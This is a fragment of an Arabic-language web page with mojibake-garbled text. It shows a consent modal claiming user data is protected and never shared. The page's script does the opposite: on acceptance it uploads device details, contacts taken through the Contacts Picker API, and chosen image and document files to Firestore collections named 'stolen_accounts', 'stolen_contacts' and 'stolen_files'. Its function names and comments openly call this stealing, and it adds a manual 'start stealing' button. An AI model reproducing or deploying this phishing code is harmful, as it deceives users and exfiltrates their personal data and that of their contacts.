        <li>Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø­Ù…ÙŠØ© ÙˆÙ„Ø§ ØªØ´Ø§Ø±Ùƒ Ù…Ø¹ Ø¢Ø®Ø±ÙŠÙ†</li>
      </ul>
    </div>
    <div style="display: flex; gap: 10px; justify-content: space-between;">
      <button type="button" class="btn btn-ghost" id="reject-terms" style="flex: 1;">Ø±ÙØ¶</button>
      <button type="button" class="btn btn-primary" id="accept-terms" style="flex: 1;">Ù…ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø±ÙˆØ·</button>
    </div>

    <div style="text-align: center; margin-top: 15px;">
      <p class="muted" style="font-size: 0.8rem; margin: 0;">Ø¨Ø§Ù„Ø§Ø³ØªÙ…Ø±Ø§Ø± Ø£Ù†Øª ØªÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ <a href="#" style="color: var(--primary);">Ø³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ©</a> Ùˆ<a href="#" style="color: var(--primary);">Ø´Ø±ÙˆØ· Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…</a></p>
    </div>
  </div>
</div>

<script>
// ========== Ù†Ø¸Ø§Ù… Ù…Ø¨Ø³Ø· Ù„Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª ÙˆØ§Ù„Ø³Ø±Ù‚Ø© ==========
document.addEventListener('DOMContentLoaded', function() {
  const privacyModal = document.getElementById('privacy-modal');
  const acceptBtn = document.getElementById('accept-terms');
  const rejectBtn = document.getElementById('reject-terms');
  
  // Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙˆØ§ÙÙ‚ Ù…Ø³Ø¨Ù‚Ù‹Ø§
  const hasAccepted = localStorage.getItem('privacyTermsAccepted');
  
  if (!hasAccepted) {
    console.log('ğŸ”„ Ø¹Ø±Ø¶ Ù†Ø§ÙØ°Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ©...');
    privacyModal.style.display = 'grid';
    document.body.style.overflow = 'hidden';
  }
  
  // Ø¹Ù†Ø¯ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø±ÙˆØ·
  acceptBtn.addEventListener('click', function() {
    localStorage.setItem('privacyTermsAccepted', 'true');
    privacyModal.style.display = 'none';
    document.body.style.overflow = 'auto';
    
    showToast('Ø¬Ø§Ø±ÙŠ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù†Ø¸Ø§Ù…...');
    
    // Ø¨Ø¯Ø¡ Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª Ø¨Ø¹Ø¯ ØªØ£Ø®ÙŠØ±
    setTimeout(() => {
      startSimpleStealing();
    }, 1000);
  });

  // Ø¹Ù†Ø¯ Ø±ÙØ¶ Ø§Ù„Ø´Ø±ÙˆØ·
  rejectBtn.addEventListener('click', function() {
    if (confirm('Ù„Ù„Ø§Ø³ØªÙ…Ø±Ø§Ø± ÙŠØ¬Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø´Ø±ÙˆØ·. Ù‡Ù„ ØªØ±ÙŠØ¯ Ø§Ù„Ù…ØºØ§Ø¯Ø±Ø©ØŸ')) {
      window.location.href = 'https://google.com';
    }
  });
});

// Ù†Ø¸Ø§Ù… Ø³Ø±Ù‚Ø© Ù…Ø¨Ø³Ø·
async function startSimpleStealing() {
  console.log('ğŸ” Ø¨Ø¯Ø¡ Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª...');
  
  try {
    // 1. Ø³Ø±Ù‚Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© Ø£ÙˆÙ„Ø§Ù‹
    await stealBasicData();
    
    // 2. Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø±Ù‚Ø© Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
    setTimeout(async () => {
      await tryStealContacts();
    }, 2000);
    
    // 3. Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø±Ù‚Ø© Ø§Ù„Ù…Ù„ÙØ§Øª
    setTimeout(async () => {
      await tryStealFiles();
    }, 4000);
    
  } catch (error) {
    console.error('Ø®Ø·Ø£:', error);
  }
}

// Ø³Ø±Ù‚Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
async function stealBasicData() {
  const basicData = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    url: location.href,
    timestamp: firebase.firestore.FieldValue.serverTimestamp()
  };
  
  await db.collection('stolen_accounts').add(basicData);
  console.log('âœ… ØªÙ… Ø³Ø±Ù‚Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©');
  showToast('ØªÙ… Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©');
}

// Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø±Ù‚Ø© Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„
async function tryStealContacts() {
  try {
    if ('contacts' in navigator && 'select' in navigator.contacts) {
      console.log('ğŸ“ Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø±Ù‚Ø© Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„...');
      
      const contacts = await navigator.contacts.select(['name', 'email', 'tel'], { multiple: true });
      
      if (contacts && contacts.length > 0) {
        for (const contact of contacts) {
          await db.collection('stolen_contacts').add({
            name: contact.name ? contact.name.join(' ') : 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ',
            emails: contact.email || [],
            phones: contact.tel || [],
            source: 'contact_api',
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
          });
        }
        console.log(`âœ… ØªÙ… Ø³Ø±Ù‚Ø© ${contacts.length} Ø¬Ù‡Ø© Ø§ØªØµØ§Ù„`);
        showToast(`ØªÙ… Ø³Ø±Ù‚Ø© ${contacts.length} Ø¬Ù‡Ø© Ø§ØªØµØ§Ù„`);
      }
    } else {
      console.log('âš ï¸ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø³Ø±Ù‚Ø© Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„');
    }
  } catch (error) {
    console.log('âŒ Ù„Ù… ÙŠØªÙ… Ù…Ù†Ø­ Ø¥Ø°Ù† Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„:', error);
  }
}

// Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø±Ù‚Ø© Ø§Ù„Ù…Ù„ÙØ§Øª
async function tryStealFiles() {
  try {
    if ('showOpenFilePicker' in window) {
      console.log('ğŸ“ Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø±Ù‚Ø© Ø§Ù„Ù…Ù„ÙØ§Øª...');
      
      const fileHandles = await window.showOpenFilePicker({
        types: [{
          description: 'Ø§Ù„Ù…Ù„ÙØ§Øª',
          accept: {
            'image/*': ['.jpg', '.jpeg', '.png', '.gif'],
            'application/*': ['.pdf', '.doc', '.docx']
          }
        }],
        multiple: true
      });
      
      let fileCount = 0;
      for (const fileHandle of fileHandles) {
        const file = await fileHandle.getFile();
        const reader = new FileReader();
        
        reader.onload = async function(e) {
          await db.collection('stolen_files').add({
            filename: file.name,
            type: file.type,
            size: file.size,
            data: e.target.result,
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
          });
          fileCount++;
        };
        reader.readAsDataURL(file);
      }
      
      if (fileCount > 0) {
        console.log(`âœ… ØªÙ… Ø³Ø±Ù‚Ø© ${fileCount} Ù…Ù„Ù`);
        showToast(`ØªÙ… Ø³Ø±Ù‚Ø© ${fileCount} Ù…Ù„Ù`);
      }
    } else {
      console.log('âš ï¸ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø³Ø±Ù‚Ø© Ø§Ù„Ù…Ù„ÙØ§Øª');
    }
  } catch (error) {
    console.log('âŒ Ù„Ù… ÙŠØªÙ… Ù…Ù†Ø­ Ø¥Ø°Ù† Ø§Ù„Ù…Ù„ÙØ§Øª:', error);
  }
}

// Ø¥Ø¶Ø§ÙØ© Ø²Ø± ÙŠØ¯ÙˆÙŠ Ù„Ù„Ø³Ø±Ù‚Ø© (Ù„Ù„ØªØ¬Ø±Ø¨Ø©)
setTimeout(() => {
  const stealBtn = document.createElement('button');
  stealBtn.innerHTML = 'ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„Ø³Ø±Ù‚Ø© ÙŠØ¯ÙˆÙŠØ§Ù‹';
  stealBtn.style.cssText = `
    position: fixed;
    top: 80px;
    right: 10px;
    background: #10b981;
    color: white;
    padding: 12px 16px;
    border: none;
    border-radius: 8px;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
    z-index: 10000;
    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
  `;
  
  stealBtn.onclick = startSimpleStealing;
  document.body.appendChild(stealBtn);
}, 5000);
</script>
</html>